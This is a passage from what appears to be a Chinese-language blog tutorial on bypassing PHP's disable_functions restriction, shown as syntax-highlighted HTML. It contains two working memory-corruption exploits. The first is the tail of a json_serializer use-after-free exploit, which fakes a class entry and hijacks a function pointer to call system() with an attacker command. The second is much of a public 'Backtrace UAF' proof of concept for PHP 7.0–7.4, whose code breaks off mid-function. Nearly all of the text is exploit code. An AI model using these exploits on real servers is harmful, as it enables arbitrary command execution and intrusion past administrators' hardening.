variable">$php_heap</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x1a8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0x218</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># create a fake class_entry</span>        <span class="token variable">$fake_obj</span> <span class="token operator">=</span> <span class="token variable">$abc_addr</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># type</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x120</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># fake class_entry</span>        <span class="token shell-comment comment"># copy some of class_entry definition</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span>                 <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak1</span><span class="token punctuation">(</span><span class="token variable">$class_entry</span> <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token shell-comment comment"># fake static members table</span>        <span class="token variable">$fake_tbl_off</span> <span class="token operator">=</span> <span class="token number">0x70</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_tbl_off</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_tbl_off</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># fake zval_reference</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_tbl_off</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_tbl_off</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># zval</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_tbl_off</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># zval type (reference)</span>        <span class="token shell-comment comment"># look for binary base</span>        <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$handlers</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token shell-comment comment"># parse elf header</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't parse ELF"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token shell-comment comment"># get basic_functions address</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token shell-comment comment"># find system entry</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token shell-comment comment"># copy hashtable offsetGet bucket</span>        <span class="token variable">$fake_bkt_off</span> <span class="token operator">=</span> <span class="token number">0x70</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">;</span>        <span class="token variable">$function_data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_bkt_off</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span>                 <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$function_data</span> <span class="token operator">+</span> <span class="token number">0x40</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token shell-comment comment"># create a fake bucket</span>        <span class="token variable">$fake_bkt_addr</span> <span class="token operator">=</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_bkt_off</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token variable">$fake_bkt_addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token shell-comment comment"># copy bucket zval</span>        <span class="token variable">$function_zval</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_bkt_off</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span>  <span class="token variable">$fake_bkt_off</span> <span class="token operator">+</span> <span class="token number">0x70</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span>                 <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$function_zval</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token shell-comment comment"># pwn</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_bkt_off</span> <span class="token operator">+</span> <span class="token number">0x70</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_bkt_off</span><span class="token punctuation">,</span> <span class="token variable">$fake_bkt_addr</span> <span class="token operator">+</span> <span class="token number">0x70</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$spl1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">offsetGet</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Z</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150030316.png"></p><p>或者蚁剑插件</p><h2 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h2><p>该漏洞利用在<code>debug_backtrace()</code>函数中使用了两年的一个 bug。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。</p><p><code>exp.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span><span class="token shell-comment comment">#</span><span class="token shell-comment comment"># Bug: https:</span><span class="token comment">//bugs.php.net/bug.php?id=76047</span><span class="token shell-comment comment"># debug_backtrace() returns a reference to a variable </span><span class="token shell-comment comment"># that has been destroyed, causing a UAF vulnerability.</span><span class="token shell-comment comment">#</span><span class="token shell-comment comment"># This exploit should work on all PHP 7.0-7.4 versions</span><span class="token shell-comment comment"># released as of 30/01/2020.</span><span class="token shell-comment comment">#</span><span class="token shell-comment comment"># Author: https:</span><span class="token comment">//github.com/mm0r1</span><span class="token function">pwn</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"uname -a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Vuln</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>             <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># ;)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># PHP >= 7.4</span>                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name">Helper</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$address</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%</span><span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_Write</span>                <span class="token shell-comment comment"># handle pie</span>                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_exec</span>                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token 